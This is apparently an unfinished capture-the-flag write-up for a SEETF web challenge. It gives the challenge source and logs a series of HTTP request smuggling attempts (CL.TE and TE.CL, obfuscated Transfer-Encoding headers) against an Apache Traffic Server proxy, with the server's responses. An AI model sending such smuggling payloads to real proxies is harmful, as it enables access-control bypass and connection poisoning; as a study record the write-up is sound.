# Challenge Name

### Description

## Solution

### Source Code

Source code reveals 3 docker containers

backend

```python
from waitress import serve
from flask import Flask, request

import os, requests

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello World!'

@app.route('/flag-count')
def flag_count():
    return '2'

@app.route('/flag-plz', methods=['POST'])
def flag():
    if request.headers.get('ADMIN_KEY') == os.environ['ADMIN_KEY']:
        if 'target' not in request.form:
            return 'Missing URL'

        requests.post(request.form['target'], data={
            'flag': os.environ['SECOND_FLAG'],
            'congrats': 'Thanks for playing!'
        })

        return 'OK, flag has been securely sent!'
            
    else:
        return 'Access denied'

@app.route('/forbidden')
def forbidden():
    return 'Forbidden', 403

serve(app, host='0.0.0.0', port=80)
```

flagportal

```ruby
require 'net/http'

class Server
    def call(env)
        req = Rack::Request.new(env)

        path = req.path
        
        if path == '/'
            return [200, {"Content-Type" => "text/html"}, [
                "<html><body>" +
                "There are <span id='count'></span> flags for you to capture here. Have fun!" +
                "<script>fetch('/api/flag-count').then(resp => resp.text()).then(data => document.getElementById('count').innerText = data)</script>" +
                "</body></html>"
            ]]

        elsif path == '/admin'
            params = req.params
            flagApi = params.fetch("backend", false) ? params.fetch("backend") : "http://backend/flag-plz"
            target = "https://bit.ly/3jzERNa"

            uri = URI(flagApi)
            req = Net::HTTP::Post.new(uri)
                req['Admin-Key'] = ENV.fetch("ADMIN_KEY")
                req['First-Flag'] = ENV.fetch("FIRST_FLAG")
                req.set_form_data('target' => target)

                res = Net::HTTP.start(uri.hostname, uri.port) {|http|
                http.request(req)
            }

            resp = res.body

            return [200, {"Content-Type" => "text/html"}, [resp]]

        elsif path == '/forbidden'
            return [403, {"Content-Type" => "text/html"}, ["You're not allowed in here."]]

        else
            return [404, {"Content-Type" => "text/html"}, ["Not Found"]]
        end
    end
end
```

remap.config

```
map /api/flag-plz   http://backend/forbidden
map /api            http://backend/
map /admin          http://flagportal/forbidden
map /               http://flagportal/
```

```
FROM ubuntu:20.04
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev
WORKDIR /ats
RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.0.0.tar.bz2 > ats.tar.bz2 && \
    tar xf ats.tar.bz2 && \
    cd trafficserver-9.0.0 && \
    ./configure --prefix=/opt/ts && \
    make && \
    make install

RUN apt -y install netcat
COPY ./remap.config /opt/ts/etc/trafficserver/remap.config
RUN chmod +r /opt/ts/etc/trafficserver/remap.config

CMD ["/opt/ts/bin/traffic_manager"]
```


https://bit.ly/3jzERNa is a rickroll. I fell for it.

proxy is trafficserver / traffic_manager

## Libraries used


I noticed 
```
waitress==2.1.0
```

which could have a CVE. Sure enough, it was

https://nvd.nist.gov/vuln/detail/CVE-2022-24761

https://github.com/Pylons/waitress/security/advisories/GHSA-4f7p-27jc-3c36
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn


https://security.snyk.io/vuln/SNYK-UNMANAGED-TRAFFICSERVER-2382200


https://www.cvedetails.com/cve/CVE-2022-24790/

https://github.com/puma/puma/security/advisories/GHSA-h99w-9q5r-gjq9
### Request Smuggling

```
POST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Content-Length: 0
Transfer-Encoding: chunked

0

GET /api/flag-plz HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

```

#### 1

```
POST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Content-Length: 0
Transfer-Encoding: chunked

0

GET /api/flag-plz HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
```

```
HTTP/1.1 405 METHOD NOT ALLOWED
Allow: HEAD, GET, OPTIONS
Content-Length: 153
Content-Type: text/html; charset=utf-8
Date: Sat, 04 Jun 2022 18:34:04 GMT
Server: ATS/9.0.0
Age: 0
Connection: keep-alive

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

#### 2

```
POST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Content-Type: application/x-www-form-urlencoded  
Content-Length: 53  
Transfer-Encoding: zchunked  
  
17  
=x&q=smuggling&x=  
0  
  
GET /api/flag-plz HTTP/1.1  
Foo: bPOST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001
```

No Response

#### 3

```
POST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 4  
Transfer-Encoding: zchunked  
  
96  
GET /404 HTTP/1.1  
X: x=1&q=smugging&x=  
Host: example.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  
  
x=  
0  
  
POST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001
```

#### 4 Results CL.TE socket poisoning
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
```
POST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: bPOST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
```

```html
HTTP/1.1 411 Content Length Required
Date: Sat, 04 Jun 2022 18:40:51 GMT
Connection: keep-alive
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 277

<HTML>
<HEAD>
<TITLE>No Content Length</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>No Content Length</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request because
there was no Content-Length specified.
</B></FONT>
<HR>
</BODY>
HTTP/1.0 400 Invalid HTTP Request
Date: Sat, 04 Jun 2022 18:40:51 GMT
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 219

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request.
</B></FONT>
<HR>
</BODY>

```

Actually the 2nd request is totally useful

```
(base) [hacker@hackerbook tmp]$ nc flagportal.chall.seetf.sg 10001 -v
flagportal.chall.seetf.sg [34.131.197.225] 10001 (scp-config) open
POST /api HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: zchunked

HTTP/1.1 411 Content Length Required
Date: Sat, 04 Jun 2022 18:52:46 GMT
Connection: keep-alive
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 277

<HTML>
<HEAD>
<TITLE>No Content Length</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>No Content Length</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request because
there was no Content-Length specified.
</B></FONT>
<HR>
</BODY>

HTTP/1.0 400 Invalid HTTP Request
Date: Sat, 04 Jun 2022 18:52:49 GMT
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 219

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request.
</B></FONT>
<HR>
</BODY>
(base) [hacker@hackerbook tmp]$ 
```

#### 5 TE.CL poisoning

```
POST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001 
Content-Type: application/x-www-form-urlencoded  
Content-Length: 4  
Transfer-Encoding: zchunked  
  
96  
GET /404 HTTP/1.1  
X: x=1&q=smugging&x=  
Host: flagportal.chall.seetf.sg:10001 
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  
  
x=  
0  
  
POST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001
```

```
HTTP/1.0 400 Invalid HTTP Request
Date: Sat, 04 Jun 2022 18:44:42 GMT
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 219

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request.
</B></FONT>
<HR>
</BODY>

```

#### 6 TE.CL Desync

TE.CL desync

```
(base) [hacker@hackerbook tmp]$ nc flagportal.chall.seetf.sg 10001 -v
flagportal.chall.seetf.sg [34.131.197.225] 10001 (scp-config) open
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

HTTP/1.1 502 Server Hangup
Date: Sat, 04 Jun 2022 18:56:27 GMT
Connection: close
Server: ATS/9.0.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 294

<HTML>
<HEAD>
<TITLE>Server Connection Closed</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Server Connection Closed</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: The server requested closed the connection before
the transaction was completed.
</B></FONT>
<HR>
</BODY>
(base) [hacker@hackerbook tmp]$ 
```


```
POST /about HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
Transfer-Encoding: chunked
Content-Length: 6

0

GET /api/flag-plz HTTP/1.1
Host: flagportal.chall.seetf.sg:10001
```

#### 7 CL.TE

```
POST /api HTTP/1.1  
Host: flagportal.chall.seetf.sg:10001 
Content-Type: application/x-www-form-urlencoded  
Content-Length: 4  
Transfer-Encoding: zchunked  
  
96  
GET /404 HTTP/1.1  
X: x=1&q=smugging&x=  
Host: flagportal.chall.seetf.sg:10001 
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  
  
```

### Running Docker

#### 1

```
POST / HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Transfer-Encoding: chunked

16
login=xxx&amp;password=xxx
0

GET /admin HTTP/1.1
Host: localhost:8000
```

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 232
Date: Sun, 05 Jun 2022 01:41:44 GMT
Age: 0
Connection: keep-alive
Server: ATS/9.0.0

<html><body>There are <span id='count'></span> flags for you to capture here. Have fun!<script>fetch('/api/flag-count').then(resp => resp.text()).then(data => document.getElementById('count').innerText = data)</script></body></html>
```

```
┌──(kali㉿kali)-[/tmp/distrib]
└─$ sudo docker-compose up                                                                                                                                          1 ⨯
Creating network "distrib_default" with the default driver
Creating distrib_proxy_1      ... done
Creating distrib_flagportal_1 ... done
Creating distrib_backend_1    ... done
Attaching to distrib_proxy_1, distrib_flagportal_1, distrib_backend_1
proxy_1       | [E. Mgmt] log ==> [TrafficManager] using root directory '/opt/ts'
flagportal_1  | Puma starting in single mode...
flagportal_1  | * Puma version: 5.6.2 (ruby 2.7.2-p137) ("Birdie's Version")
flagportal_1  | *  Min threads: 0
flagportal_1  | *  Max threads: 5
flagportal_1  | *  Environment: development
flagportal_1  | *          PID: 1
flagportal_1  | * Listening on http://0.0.0.0:80
flagportal_1  | Use Ctrl-C to stop
flagportal_1  | 2022-06-05 01:35:22 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
flagportal_1  | 2022-06-05 01:36:25 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
flagportal_1  | 2022-06-05 01:38:18 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
flagportal_1  | 2022-06-05 01:41:17 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
flagportal_1  | 2022-06-05 01:41:27 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
flagportal_1  | 2022-06-05 01:41:44 +0000 HTTP parse error, malformed request: #<Puma::HttpParserError: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma?>
```

#### 2

```
POST /api HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Transfer-Encoding: chunked

16
login=xxx&amp;password=xxx
0

GET /admin HTTP/1.1
Host: localhost:8000
```

```
HTTP/1.1 400 Bad Request
Content-Length: 71
Content-Type: text/plain
Date: Sun, 05 Jun 2022 01:46:07 GMT
Server: ATS/9.0.0
Age: 0
Connection: keep-alive

Bad Request

Chunk not properly terminated

(generated by waitress)
```

## Flag
``
